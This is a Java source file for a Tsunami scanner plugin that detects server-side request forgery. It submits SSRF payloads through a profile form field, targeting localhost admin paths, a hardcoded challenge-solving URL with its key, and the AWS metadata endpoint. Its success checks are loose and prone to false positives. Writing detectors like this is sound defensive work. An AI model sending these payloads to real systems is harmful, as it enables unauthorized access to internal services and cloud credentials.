/*
 * Copyright 2024 Lukas Pirch
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.raid;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static java.lang.String.format;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.inject.Inject;
import com.google.protobuf.util.Timestamps;
import com.google.protobuf.ByteString;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import com.google.tsunami.common.net.http.HttpHeaders;

import java.io.IOException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.time.Clock;
import java.util.regex.Pattern;
import java.util.regex.Matcher;

@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "SsrfdetectorpluginDetector",
    version = "0.1",
    description = "Detects SsrfDetectorPlugin vulnerability.",
    author = "Joscha, Elena the Debug Dingos",
    bootstrapModule = SsrfdetectorpluginDetectorBootstrapModule.class)
public final class SsrfdetectorpluginDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private final HttpClient httpClient;
  private final Clock utcClock;
  private String token = "";

  @Inject
  public SsrfdetectorpluginDetector(HttpClient httpClient, @UtcClock Clock utcClock) {
    this.httpClient = httpClient;
    this.utcClock = checkNotNull(utcClock);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Starting detection for Ssrfdetectorplugin Detector");
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    int successfulAttacks = 0;
    
    try {
        HttpHeaders headers = HttpHeaders.builder()
            .addHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
            .addHeader("Content-Type", "application/x-www-form-urlencoded")
            .build();

        // Test 1: Primary SSRF payload - localhost with specific challenge URL
        String payload1 = "http://localhost:3000/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3";
        if (testSsrfPayload(networkService, targetUri, headers, payload1)) {
            successfulAttacks++;
        }

        // Test 2: Alternative localhost IP - 127.0.0.1 with challenge URL
        String payload2 = "http://127.0.0.1:3000/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3";
        if (testSsrfPayload(networkService, targetUri, headers, payload2)) {
            successfulAttacks++;
        }

        // Test 3: Generic localhost admin access
        String payload3 = "http://localhost/admin";
        if (testSsrfPayload(networkService, targetUri, headers, payload3)) {
            successfulAttacks++;
        }

        // Test 4: Generic 127.0.0.1 admin access
        String payload4 = "http://127.0.0.1/admin";
        if (testSsrfPayload(networkService, targetUri, headers, payload4)) {
            successfulAttacks++;
        }

        // Test 5: AWS metadata service access
        String payload5 = "http://169.254.169.254/latest/meta-data/";
        if (testSsrfPayload(networkService, targetUri, headers, payload5)) {
            successfulAttacks++;
        }

        return successfulAttacks > 0;
    } catch (IOException e) {
        logger.atWarning().log(
            format("SSRF test failed on '%s': %s", networkService, e.getMessage()));
        return false;
    }
}

private boolean testSsrfPayload(NetworkService networkService, String targetUri, HttpHeaders headers, String payload) throws IOException {
    // First, try to access the profile page to get any necessary tokens or session info
    HttpResponse profileResponse = httpClient.send(
        HttpRequest.get(targetUri + "/profile")
            .setHeaders(headers)
            .build(),
        networkService);

    if (profileResponse.status().code() != 200) {
        return false;
    }

    // Extract any CSRF tokens or session information if needed
    String profileBody = profileResponse.bodyBytes()
        .map(bs -> bs.toStringUtf8())
        .orElse("");

    // Prepare the SSRF payload as form data for Gravatar URL
    String formData = "url=" + URLEncoder.encode(payload, StandardCharsets.UTF_8);

    // Send the SSRF payload via POST to profile endpoint (simulating Gravatar URL submission)
    HttpResponse ssrfResponse = httpClient.send(
        HttpRequest.post(targetUri + "/profile")
            .setHeaders(headers)
            .setRequestBody(ByteString.copyFromUtf8(formData))
            .build(),
        networkService);

    // Also try via a potential gravatar-specific endpoint
    HttpResponse gravatarResponse = httpClient.send(
        HttpRequest.post(targetUri + "/profile/image")
            .setHeaders(headers)
            .setRequestBody(ByteString.copyFromUtf8(formData))
            .build(),
        networkService);

    // Check for successful SSRF indicators
    return checkSsrfSuccess(ssrfResponse, payload) || checkSsrfSuccess(gravatarResponse, payload);
}

private boolean checkSsrfSuccess(HttpResponse response, String payload) {
    if (response.status().code() == 200) {
        String responseBody = response.bodyBytes()
            .map(bs -> bs.toStringUtf8())
            .orElse("");

        // Check for specific success indicators based on the payload
        if (payload.contains("solve/challenges/server-side")) {
            // Look for challenge completion indicators
            if (responseBody.contains("challenge solved") || 
                responseBody.contains("congratulations") ||
                responseBody.contains("success") ||
                responseBody.contains("completed")) {
                return true;
            }
        }

        // Check for admin panel access indicators
        if (payload.contains("/admin")) {
            if (responseBody.contains("admin") ||
                responseBody.contains("dashboard") ||
                responseBody.contains("control panel")) {
                return true;
            }
        }

        // Check for AWS metadata service indicators
        if (payload.contains("169.254.169.254")) {
            if (responseBody.contains("ami-id") ||
                responseBody.contains("instance-id") ||
                responseBody.contains("security-credentials")) {
                return true;
            }
        }

        // Generic SSRF success indicators
        if (responseBody.contains("localhost") ||
            responseBody.contains("127.0.0.1") ||
            responseBody.contains("internal") ||
            responseBody.length() > 1000) { // Significant response suggesting successful request
            return true;
        }
    }

    // Check for error responses that might indicate successful internal requests
    if (response.status().code() == 500 || response.status().code() == 502 || response.status().code() == 503) {
        String errorBody = response.bodyBytes()
            .map(bs -> bs.toStringUtf8())
            .orElse("");
        
        // Look for connection-related errors that suggest the server tried to make the request
        if (errorBody.contains("connection") ||
            errorBody.contains("timeout") ||
            errorBody.contains("refused") ||
            errorBody.contains("unreachable")) {
            return true;
        }
    }

    return false;
}

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(
            Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("SSRFDETECTORPLUGIN_VULNERABILITY"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("SsrfDetectorPlugin Vulnerability Exposed")
                .setDescription("The application is vulnerable to SsrfDetectorPlugin attacks.")
                .setRecommendation(
                    "Implement proper URL validation, use allowlists for permitted domains, and restrict access to internal network resources from user-controlled inputs"))
        .build();
  }
  
  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(
        Vulnerability.newBuilder()
            .setMainId(
                VulnerabilityId.newBuilder()
                    .setPublisher("TSUNAMI_COMMUNITY")
                    .setValue("SSRFDETECTORPLUGIN_VULNERABILITY"))
            .setSeverity(Severity.CRITICAL)
            .setTitle("SsrfDetectorPlugin Vulnerability Exposed")
            .setDescription(
                "The application is vulnerable to SsrfDetectorPlugin attacks.")
            .setRecommendation(
                "Implement proper URL validation, use allowlists for permitted domains, and restrict access to internal network resources from user-controlled inputs")
        .build());
  }
}